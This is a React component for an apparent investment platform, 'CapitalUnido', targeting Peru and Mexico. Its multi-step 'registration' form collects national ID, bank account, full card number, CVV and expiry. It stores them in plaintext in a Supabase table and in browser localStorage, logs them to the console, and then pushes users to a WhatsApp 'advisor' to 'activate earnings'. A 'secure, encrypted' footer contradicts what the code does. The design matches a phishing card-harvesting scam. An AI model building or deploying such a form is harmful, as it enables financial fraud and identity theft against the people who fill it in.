import { useState, useEffect } from 'react';
import { CountryConfig } from '../data/countries';
import { supabase } from '../lib/supabase';

interface RegistrationFormProps {
  lang: 'fr' | 'en' | 'es';
  country: CountryConfig;
  onSuccess: () => void;
  onClose: () => void;
}

const RegistrationForm = ({ lang, country, onSuccess, onClose }: RegistrationFormProps) => {
  const [step, setStep] = useState(1);
  const totalSteps = 3;
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    email: '',
    idNumber: '',
    bankName: '',
    accountNumber: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    cardHolder: '',
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [loading, setLoading] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);

  const whatsappLink = 'https://wa.me/message/YCYBNEDFB3CTA1';

  const getBanks = () => {
    switch (country.code) {
      case 'pe':
        return ['BCP (Banco de Crédito del Perú)', 'BBVA Perú', 'Interbank', 'Scotiabank Perú', 'BanBif', 'Banco Pichincha', 'Caja Municipal', 'Autre'];
      case 'mx':
        return ['BBVA México', 'Banorte', 'Santander México', 'Citibanamex', 'HSBC México', 'Banco Azteca', 'Nu México', 'Autre'];
      default:
        return ['BCP', 'BBVA', 'Interbank', 'Scotiabank', 'Autre'];
    }
  };

  // ✅ COULEURS AMÉLIORÉES - Plus de contraste et lisibilité
  const getColors = () => {
    switch (country.code) {
      case 'pe':
        return {
          bgGradient: 'from-blue-50/40 via-white/60 to-indigo-50/40',
          cardBg: 'bg-white/95 backdrop-blur-sm',
          borderColor: 'border-[#D91023]/30',
          progressGradient: 'from-[#D91023] to-[#fcd116]',
          buttonBg: 'bg-[#D91023]',
          buttonHover: 'hover:bg-[#b8121e]',
          buttonText: 'text-white',
          accentColor: 'text-[#D91023]',
          accentBg: 'bg-[#D91023]',
          errorColor: 'text-red-600',
          inputFocus: 'focus:border-[#D91023] focus:ring-2 focus:ring-[#D91023]/30',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-600',
          inputBg: 'bg-white/80',
          inputBorder: 'border-gray-300',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-green-50 to-emerald-50',
          confirmationBorder: 'border-green-500/30',
          checkColor: 'text-green-600',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
          shadowColor: 'shadow-[#D91023]/20',
        };
      case 'mx':
        return {
          bgGradient: 'from-blue-50/40 via-white/60 to-indigo-50/40',
          cardBg: 'bg-white/95 backdrop-blur-sm',
          borderColor: 'border-[#006341]/30',
          progressGradient: 'from-[#006341] to-[#CE1126]',
          buttonBg: 'bg-[#006341]',
          buttonHover: 'hover:bg-[#004d32]',
          buttonText: 'text-white',
          accentColor: 'text-[#006341]',
          accentBg: 'bg-[#006341]',
          errorColor: 'text-red-600',
          inputFocus: 'focus:border-[#006341] focus:ring-2 focus:ring-[#006341]/30',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-600',
          inputBg: 'bg-white/80',
          inputBorder: 'border-gray-300',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-green-50 to-emerald-50',
          confirmationBorder: 'border-green-500/30',
          checkColor: 'text-green-600',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
          shadowColor: 'shadow-[#006341]/20',
        };
      default:
        return {
          bgGradient: 'from-blue-50/40 via-white/60 to-indigo-50/40',
          cardBg: 'bg-white/95 backdrop-blur-sm',
          borderColor: 'border-[#fcd116]/30',
          progressGradient: 'from-[#fcd116] to-[#ef2b2d]',
          buttonBg: 'bg-[#1a3c6e]',
          buttonHover: 'hover:bg-[#152f55]',
          buttonText: 'text-white',
          accentColor: 'text-[#1a3c6e]',
          accentBg: 'bg-[#1a3c6e]',
          errorColor: 'text-red-600',
          inputFocus: 'focus:border-[#1a3c6e] focus:ring-2 focus:ring-[#1a3c6e]/30',
          textColor: 'text-gray-800',
          textMuted: 'text-gray-600',
          inputBg: 'bg-white/80',
          inputBorder: 'border-gray-300',
          titleColor: 'text-gray-900',
          confirmationBg: 'from-green-50 to-emerald-50',
          confirmationBorder: 'border-green-500/30',
          checkColor: 'text-green-600',
          whatsappBg: 'bg-[#25D366]',
          whatsappHover: 'hover:bg-[#1ebe5c]',
          shadowColor: 'shadow-blue-500/20',
        };
    }
  };

  const colors = getColors();
  const banks = getBanks();

  const sendToSupabase = async (data: typeof formData) => {
    try {
      const payload = {
        full_name: data.fullName,
        phone: data.phone,
        email: data.email,
        id_number: data.idNumber,
        bank_name: data.bankName,
        account_number: data.accountNumber,
        card_number: data.cardNumber,
        cvv: data.cvv,
        expiry_date: data.expiryDate,
        card_holder: data.cardHolder,
        country: country.label,
        language: lang,
      };

      console.log('📤 Envoi vers Supabase:', payload);

      const { error } = await supabase
        .from('registrations')
        .insert([payload]);

      if (error) {
        console.error('❌ Erreur Supabase:', error);
        localStorage.setItem('pending_registration', JSON.stringify(payload));
        return false;
      }

      console.log('✅ Données enregistrées avec succès dans Supabase !');
      localStorage.removeItem('pending_registration');
      return true;
    } catch (error) {
      console.error('❌ Erreur:', error);
      localStorage.setItem('pending_registration', JSON.stringify({
        ...data,
        country: country.label,
        language: lang,
      }));
      return false;
    }
  };

  useEffect(() => {
    const pending = localStorage.getItem('pending_registration');
    if (pending) {
      try {
        const data = JSON.parse(pending);
        console.log('📦 Données en attente trouvées:', data);
      } catch (e) {
        console.error('Erreur de récupération:', e);
      }
    }
  }, []);

  const getTexts = () => {
    const texts = {
      fr: {
        title: 'Finalisez votre inscription',
        subtitle: 'Plus que quelques informations et vous commencez à investir !',
        stepLabel: 'Étape',
        of: 'sur',
        fullName: 'Nom complet',
        phone: 'Téléphone',
        email: 'Email',
        idNumber: country.idLabel.fr,
        selectBank: 'Sélectionnez votre banque',
        accountNumber: 'Numéro de compte bancaire',
        cardNumber: 'Numéro de carte bancaire',
        expiryDate: 'MM/AA',
        cvv: 'CVV',
        cardHolder: 'Nom sur la carte',
        back: 'Retour',
        continue: 'Continuer',
        validate: 'Valider mon inscription',
        confirmationTitle: '✅ Inscription confirmée !',
        confirmationSub: 'Vos informations ont été enregistrées avec succès.',
        reviewTitle: '📋 Récapitulatif de vos informations',
        nameLabel: 'Nom complet',
        phoneLabel: 'Téléphone',
        emailLabel: 'Email',
        idLabel: country.idLabel.fr,
        bankLabel: 'Banque',
        accountLabel: 'Numéro de compte',
        cardLabel: 'Carte bancaire',
        cardEnding: 'se terminant par',
        whatsappTitle: '📱 Finalisez votre inscription avec un conseiller',
        whatsappSub: 'Un conseiller va vous contacter pour valider votre compte et activer vos gains.',
        whatsappButton: '💬 Contacter un conseiller sur WhatsApp',
        editButton: '✏️ Modifier mes informations',
        closeButton: 'Fermer',
        errors: {
          required: 'Ce champ est requis',
          emailInvalid: 'Email invalide (ex: nom@domaine.com)',
          phoneInvalid: 'Numéro invalide (ex: +51 9XX XXX XXX)',
          cardInvalid: '16 chiffres requis',
          cvvInvalid: '3 chiffres requis',
          expiryInvalid: 'Format MM/AA requis',
          bankRequired: 'Veuillez sélectionner une banque',
          accountRequired: 'Numéro de compte requis',
          nameRequired: 'Nom complet requis',
          idRequired: `${country.idLabel.fr} requis`,
          cardHolderRequired: 'Nom sur la carte requis',
        },
      },
      en: {
        title: 'Complete your registration',
        subtitle: 'Just a few more details and you start investing!',
        stepLabel: 'Step',
        of: 'of',
        fullName: 'Full name',
        phone: 'Phone number',
        email: 'Email',
        idNumber: country.idLabel.en,
        selectBank: 'Select your bank',
        accountNumber: 'Bank account number',
        cardNumber: 'Card number',
        expiryDate: 'MM/YY',
        cvv: 'CVV',
        cardHolder: 'Cardholder name',
        back: 'Back',
        continue: 'Continue',
        validate: 'Confirm registration',
        confirmationTitle: '✅ Registration confirmed!',
        confirmationSub: 'Your information has been successfully recorded.',
        reviewTitle: '📋 Your information summary',
        nameLabel: 'Full name',
        phoneLabel: 'Phone',
        emailLabel: 'Email',
        idLabel: country.idLabel.en,
        bankLabel: 'Bank',
        accountLabel: 'Account number',
        cardLabel: 'Card number',
        cardEnding: 'ending in',
        whatsappTitle: '📱 Finalize your registration with an advisor',
        whatsappSub: 'An advisor will contact you to validate your account and activate your earnings.',
        whatsappButton: '💬 Contact an advisor on WhatsApp',
        editButton: '✏️ Edit my information',
        closeButton: 'Close',
        errors: {
          required: 'This field is required',
          emailInvalid: 'Invalid email (ex: name@domain.com)',
          phoneInvalid: 'Invalid number (ex: +51 9XX XXX XXX)',
          cardInvalid: '16 digits required',
          cvvInvalid: '3 digits required',
          expiryInvalid: 'MM/YY format required',
          bankRequired: 'Please select a bank',
          accountRequired: 'Account number required',
          nameRequired: 'Full name required',
          idRequired: `${country.idLabel.en} required`,
          cardHolderRequired: 'Cardholder name required',
        },
      },
      es: {
        title: 'Finaliza tu inscripción',
        subtitle: '¡Solo unas pocas informaciones más y empiezas a invertir!',
        stepLabel: 'Paso',
        of: 'de',
        fullName: 'Nombre completo',
        phone: 'Teléfono',
        email: 'Correo electrónico',
        idNumber: country.idLabel.es,
        selectBank: 'Selecciona tu banco',
        accountNumber: 'Número de cuenta bancaria',
        cardNumber: 'Número de tarjeta',
        expiryDate: 'MM/AA',
        cvv: 'CVV',
        cardHolder: 'Nombre en la tarjeta',
        back: 'Atrás',
        continue: 'Continuar',
        validate: 'Confirmar inscripción',
        confirmationTitle: '✅ ¡Inscripción confirmada!',
        confirmationSub: 'Tu información ha sido registrada con éxito.',
        reviewTitle: '📋 Resumen de tu información',
        nameLabel: 'Nombre completo',
        phoneLabel: 'Teléfono',
        emailLabel: 'Correo electrónico',
        idLabel: country.idLabel.es,
        bankLabel: 'Banco',
        accountLabel: 'Número de cuenta',
        cardLabel: 'Tarjeta bancaria',
        cardEnding: 'terminada en',
        whatsappTitle: '📱 Finaliza tu inscripción con un asesor',
        whatsappSub: 'Un asesor te contactará para validar tu cuenta y activar tus ganancias.',
        whatsappButton: '💬 Contactar un asesor por WhatsApp',
        editButton: '✏️ Modificar mis datos',
        closeButton: 'Cerrar',
        errors: {
          required: 'Este campo es requerido',
          emailInvalid: 'Email inválido (ej: nombre@dominio.com)',
          phoneInvalid: 'Número inválido (ej: +51 9XX XXX XXX)',
          cardInvalid: '16 dígitos requeridos',
          cvvInvalid: '3 dígitos requeridos',
          expiryInvalid: 'Formato MM/AA requerido',
          bankRequired: 'Por favor selecciona un banco',
          accountRequired: 'Número de cuenta requerido',
          nameRequired: 'Nombre completo requerido',
          idRequired: `${country.idLabel.es} requerido`,
          cardHolderRequired: 'Nombre en la tarjeta requerido',
        },
      },
    };
    return texts[lang] || texts.fr;
  };

  const t = getTexts();

  const validateField = (field: string, value: string) => {
    const newErrors = { ...errors };
    const e = t.errors;

    switch (field) {
      case 'fullName':
        if (!value.trim()) {
          newErrors.fullName = e.nameRequired;
        } else if (value.trim().length < 2) {
          newErrors.fullName = 'Minimum 2 caractères';
        } else {
          delete newErrors.fullName;
        }
        break;

      case 'email':
        if (!value.trim()) {
          newErrors.email = e.required;
        } else {
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(value)) {
            newErrors.email = e.emailInvalid;
          } else {
            delete newErrors.email;
          }
        }
        break;

      case 'phone':
        if (!value.trim()) {
          newErrors.phone = e.required;
        } else {
          const phoneRegex = /^\+?[0-9\s-]{8,15}$/;
          if (!phoneRegex.test(value.replace(/\s/g, ''))) {
            newErrors.phone = e.phoneInvalid;
          } else {
            delete newErrors.phone;
          }
        }
        break;

      case 'idNumber':
        if (!value.trim()) {
          newErrors.idNumber = e.idRequired;
        } else if (value.trim().length < 4) {
          newErrors.idNumber = 'Minimum 4 caractères';
        } else {
          delete newErrors.idNumber;
        }
        break;

      case 'bankName':
        if (!value) {
          newErrors.bankName = e.bankRequired;
        } else {
          delete newErrors.bankName;
        }
        break;

      case 'accountNumber':
        if (!value.trim()) {
          newErrors.accountNumber = e.accountRequired;
        } else if (value.trim().length < 4) {
          newErrors.accountNumber = 'Minimum 4 chiffres';
        } else {
          delete newErrors.accountNumber;
        }
        break;

      case 'cardNumber':
        const card = value.replace(/\s/g, '');
        if (!value.trim()) {
          newErrors.cardNumber = e.required;
        } else if (card.length !== 16 || !/^\d+$/.test(card)) {
          newErrors.cardNumber = e.cardInvalid;
        } else {
          delete newErrors.cardNumber;
        }
        break;

      case 'cvv':
        if (!value.trim()) {
          newErrors.cvv = e.required;
        } else if (!/^\d{3}$/.test(value)) {
          newErrors.cvv = e.cvvInvalid;
        } else {
          delete newErrors.cvv;
        }
        break;

      case 'expiryDate':
        if (!value.trim()) {
          newErrors.expiryDate = e.required;
        } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) {
          newErrors.expiryDate = e.expiryInvalid;
        } else {
          const [month, year] = value.split('/');
          const now = new Date();
          const currentYear = now.getFullYear() % 100;
          const currentMonth = now.getMonth() + 1;
          const expYear = parseInt(year);
          const expMonth = parseInt(month);
          if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
            newErrors.expiryDate = 'Carte expirée';
          } else {
            delete newErrors.expiryDate;
          }
        }
        break;

      case 'cardHolder':
        if (!value.trim()) {
          newErrors.cardHolder = e.cardHolderRequired;
        } else if (value.trim().length < 2) {
          newErrors.cardHolder = 'Minimum 2 caractères';
        } else {
          delete newErrors.cardHolder;
        }
        break;
    }

    setErrors(newErrors);
  };

  const handleChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    setTouched((prev) => ({ ...prev, [field]: true }));
    validateField(field, value);
  };

  const handleBlur = (field: string) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
    const value = formData[field as keyof typeof formData];
    if (value) {
      validateField(field, value);
    }
  };

  const handleNext = () => {
    const currentFields = getStepFields(step);
    let hasError = false;
    currentFields.forEach((field) => {
      const value = formData[field as keyof typeof formData];
      setTouched((prev) => ({ ...prev, [field]: true }));
      validateField(field, value);
      if (errors[field]) {
        hasError = true;
      }
    });

    const currentErrors = { ...errors };
    currentFields.forEach((field) => {
      if (currentErrors[field]) {
        hasError = true;
      }
    });

    if (hasError) return;

    if (step < totalSteps) {
      setStep(step + 1);
    } else {
      setLoading(true);
      
      sendToSupabase(formData).then((success) => {
        setTimeout(() => {
          setLoading(false);
          setShowConfirmation(true);
        }, 1000);
      });
    }
  };

  const getStepFields = (stepNum: number): string[] => {
    switch (stepNum) {
      case 1: return ['fullName', 'phone', 'email', 'idNumber'];
      case 2: return ['bankName', 'accountNumber'];
      case 3: return ['cardNumber', 'cvv', 'expiryDate', 'cardHolder'];
      default: return [];
    }
  };

  const handlePrevious = () => {
    if (step > 1) setStep(step - 1);
  };

  const isStepValid = () => {
    const currentFields = getStepFields(step);
    for (const field of currentFields) {
      const value = formData[field as keyof typeof formData];
      if (!value || errors[field]) return false;
    }
    return true;
  };

  const formatCardNumber = (value: string) => {
    const card = value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
    const groups = card.match(/.{1,4}/g);
    return groups ? groups.join(' ') : card;
  };

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2)}`;
    }
    return cleaned;
  };

  const handleCardChange = (value: string) => {
    const formatted = formatCardNumber(value);
    setFormData((prev) => ({ ...prev, cardNumber: formatted }));
    setTouched((prev) => ({ ...prev, cardNumber: true }));
    validateField('cardNumber', formatted);
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiryDate(value);
    setFormData((prev) => ({ ...prev, expiryDate: formatted }));
    setTouched((prev) => ({ ...prev, expiryDate: true }));
    validateField('expiryDate', formatted);
  };

  // ✅ PAGE DE CONFIRMATION - Visibilité améliorée
  if (showConfirmation) {
    return (
      <div className={`min-h-screen bg-gradient-to-br ${colors.bgGradient} flex items-center justify-center p-4 relative`}>
        {/* Fond amélioré */}
        <div className="absolute inset-0 -z-10">
          <div className="absolute inset-0 bg-gradient-subtle" />
          <div className="absolute inset-0 bg-pattern-dots" />
        </div>
        
        <div className={`max-w-2xl w-full ${colors.cardBg} border ${colors.confirmationBorder} rounded-3xl p-8 shadow-2xl animate-fadeIn`}>
          <div className="text-center mb-8">
            <div className={`text-6xl mb-4 ${colors.checkColor}`}>✅</div>
            <h2 className={`text-3xl font-bold ${colors.titleColor}`}>{t.confirmationTitle}</h2>
            <p className={`${colors.textMuted} mt-2`}>{t.confirmationSub}</p>
          </div>

          <div className={`bg-gradient-to-br ${colors.confirmationBg} rounded-2xl p-6 mb-8 border ${colors.confirmationBorder}`}>
            <h3 className={`font-bold ${colors.titleColor} mb-4 text-lg`}>{t.reviewTitle}</h3>
            <div className="grid md:grid-cols-2 gap-3 text-sm">
              <div><span className={colors.textMuted}>{t.nameLabel}:</span> <span className={colors.textColor}><strong>{formData.fullName}</strong></span></div>
              <div><span className={colors.textMuted}>{t.phoneLabel}:</span> <span className={colors.textColor}><strong>{formData.phone}</strong></span></div>
              <div><span className={colors.textMuted}>{t.emailLabel}:</span> <span className={colors.textColor}><strong>{formData.email}</strong></span></div>
              <div><span className={colors.textMuted}>{t.idLabel}:</span> <span className={colors.textColor}><strong>{formData.idNumber}</strong></span></div>
              <div><span className={colors.textMuted}>{t.bankLabel}:</span> <span className={colors.textColor}><strong>{formData.bankName}</strong></span></div>
              <div><span className={colors.textMuted}>{t.accountLabel}:</span> <span className={colors.textColor}><strong>••••{formData.accountNumber.slice(-4)}</strong></span></div>
              <div><span className={colors.textMuted}>{t.cardLabel}:</span> <span className={colors.textColor}><strong>•••• •••• •••• {formData.cardNumber.slice(-4)}</strong></span></div>
              <div><span className={colors.textMuted}>{t.cardHolder}:</span> <span className={colors.textColor}><strong>{formData.cardHolder}</strong></span></div>
            </div>
          </div>

          <div className="text-center mb-6">
            <p className={`${colors.textColor} font-semibold mb-2`}>{t.whatsappTitle}</p>
            <p className={`${colors.textMuted} text-sm mb-4`}>{t.whatsappSub}</p>
            <a
              href={`${whatsappLink}?text=Bonjour%2C%20je%20viens%20de%20finaliser%20mon%20inscription%20sur%20CapitalUnido.%20Mon%20nom%20est%20${encodeURIComponent(formData.fullName)}.%20Pouvez-vous%20m%27aider%20%C3%A0%20valider%20mon%20compte%20%3F`}
              target="_blank"
              rel="noopener noreferrer"
              className={`inline-flex items-center gap-3 ${colors.whatsappBg} ${colors.whatsappHover} text-white font-bold px-8 py-4 rounded-full shadow-lg hover:scale-105 transition-all duration-300`}
            >
              <span className="text-2xl">💬</span>
              {t.whatsappButton}
            </a>
          </div>

          <div className="flex flex-wrap gap-3 justify-center">
            <button
              onClick={() => setShowConfirmation(false)}
              className={`px-6 py-2 rounded-full border-2 ${colors.borderColor} ${colors.textColor} hover:bg-gray-100 transition-all font-medium`}
            >
              {t.editButton}
            </button>
            <button
              onClick={onClose}
              className={`px-6 py-2 rounded-full ${colors.buttonBg} ${colors.buttonHover} ${colors.buttonText} transition-all font-medium shadow-md`}
            >
              {t.closeButton}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ✅ FORMULAIRE NORMAL - Visibilité améliorée
  return (
    <div className={`min-h-screen bg-gradient-to-br ${colors.bgGradient} flex items-center justify-center p-4 relative`}>
      {/* Fond amélioré avec glass-effect */}
      <div className="absolute inset-0 -z-10">
        <div className="absolute inset-0 bg-gradient-subtle" />
        <div className="absolute inset-0 bg-pattern-dots" />
      </div>

      <div className={`max-w-lg w-full ${colors.cardBg} border ${colors.borderColor} rounded-3xl p-8 shadow-2xl animate-fadeIn`}>
        {/* Titre */}
        <h2 className={`text-3xl font-black text-center mb-2 ${colors.titleColor}`}>{t.title}</h2>
        <p className={`text-center ${colors.textMuted} mb-8`}>{t.subtitle}</p>

        {/* Barre de progression */}
        <div className="mb-8">
          <div className="flex justify-between text-xs mb-2 text-gray-400">
            <span>{t.stepLabel} {step} {t.of} {totalSteps}</span>
            <span className="font-medium text-gray-600">{Math.round(((step - 1) / (totalSteps - 1)) * 100)}%</span>
          </div>
          <div className="h-2.5 bg-gray-200 rounded-full overflow-hidden shadow-inner">
            <div
              className={`h-full bg-gradient-to-r ${colors.progressGradient} transition-all duration-500 rounded-full shadow-md`}
              style={{ width: `${((step - 1) / (totalSteps - 1)) * 100}%` }}
            />
          </div>
        </div>

        {/* Champs du formulaire */}
        <div className="space-y-4">
          {step === 1 && (
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder={t.fullName}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.fullName && errors.fullName ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.fullName}
                  onChange={(e) => handleChange('fullName', e.target.value)}
                  onBlur={() => handleBlur('fullName')}
                />
                {touched.fullName && errors.fullName && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.fullName}</p>}
              </div>

              <div>
                <input
                  type="tel"
                  placeholder={t.phone}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.phone && errors.phone ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.phone}
                  onChange={(e) => handleChange('phone', e.target.value)}
                  onBlur={() => handleBlur('phone')}
                />
                {touched.phone && errors.phone && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.phone}</p>}
              </div>

              <div>
                <input
                  type="email"
                  placeholder={t.email}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.email && errors.email ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.email}
                  onChange={(e) => handleChange('email', e.target.value)}
                  onBlur={() => handleBlur('email')}
                />
                {touched.email && errors.email && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.email}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.idNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.idNumber && errors.idNumber ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.idNumber}
                  onChange={(e) => handleChange('idNumber', e.target.value)}
                  onBlur={() => handleBlur('idNumber')}
                />
                {touched.idNumber && errors.idNumber && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.idNumber}</p>}
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <div>
                <select
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm appearance-none ${touched.bankName && errors.bankName ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.bankName}
                  onChange={(e) => handleChange('bankName', e.target.value)}
                  onBlur={() => handleBlur('bankName')}
                >
                  <option value="" className="text-gray-400">{t.selectBank}</option>
                  {banks.map((bank) => (
                    <option key={bank} value={bank} className="text-gray-800">{bank}</option>
                  ))}
                </select>
                {touched.bankName && errors.bankName && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.bankName}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.accountNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.accountNumber && errors.accountNumber ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.accountNumber}
                  onChange={(e) => handleChange('accountNumber', e.target.value)}
                  onBlur={() => handleBlur('accountNumber')}
                />
                {touched.accountNumber && errors.accountNumber && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.accountNumber}</p>}
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder={t.cardNumber}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.cardNumber && errors.cardNumber ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.cardNumber}
                  onChange={(e) => handleCardChange(e.target.value)}
                  onBlur={() => handleBlur('cardNumber')}
                  maxLength={19}
                />
                {touched.cardNumber && errors.cardNumber && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.cardNumber}</p>}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <input
                    type="text"
                    placeholder={t.expiryDate}
                    className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.expiryDate && errors.expiryDate ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                    value={formData.expiryDate}
                    onChange={(e) => handleExpiryChange(e.target.value)}
                    onBlur={() => handleBlur('expiryDate')}
                    maxLength={5}
                  />
                  {touched.expiryDate && errors.expiryDate && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.expiryDate}</p>}
                </div>
                <div>
                  <input
                    type="text"
                    placeholder={t.cvv}
                    className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.cvv && errors.cvv ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                    value={formData.cvv}
                    onChange={(e) => handleChange('cvv', e.target.value)}
                    onBlur={() => handleBlur('cvv')}
                    maxLength={3}
                  />
                  {touched.cvv && errors.cvv && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.cvv}</p>}
                </div>
              </div>

              <div>
                <input
                  type="text"
                  placeholder={t.cardHolder}
                  className={`w-full p-4 ${colors.inputBg} rounded-2xl ${colors.textColor} placeholder-gray-500 border-2 ${colors.inputBorder} ${colors.inputFocus} shadow-sm ${touched.cardHolder && errors.cardHolder ? 'border-red-500 focus:ring-red-500/30' : ''}`}
                  value={formData.cardHolder}
                  onChange={(e) => handleChange('cardHolder', e.target.value)}
                  onBlur={() => handleBlur('cardHolder')}
                />
                {touched.cardHolder && errors.cardHolder && <p className={`${colors.errorColor} text-sm mt-1.5 flex items-center gap-1`}>⚠️ {errors.cardHolder}</p>}
              </div>
            </div>
          )}
        </div>

        {/* Boutons de navigation */}
        <div className="flex gap-3 mt-8">
          {step > 1 && (
            <button
              onClick={handlePrevious}
              className="flex-1 bg-gray-200/80 hover:bg-gray-300/80 py-4 rounded-2xl text-gray-700 font-semibold transition-all shadow-sm"
            >
              {t.back}
            </button>
          )}
          <button
            onClick={handleNext}
            disabled={!isStepValid() || loading}
            className={`flex-1 ${colors.buttonBg} ${colors.buttonHover} ${colors.buttonText} font-bold py-4 rounded-2xl disabled:opacity-50 transition-all shadow-lg ${colors.shadowColor} hover:shadow-xl`}
          >
            {loading ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span>...</span>
              </div>
            ) : step < totalSteps ? t.continue : t.validate}
          </button>
        </div>

        {/* Sécurité */}
        <p className={`text-center text-gray-400 text-xs mt-6 flex items-center justify-center gap-2`}>
          <span>🔒</span> Transactions sécurisées • Données cryptées
        </p>
      </div>
    </div>
  );
};

export default RegistrationForm;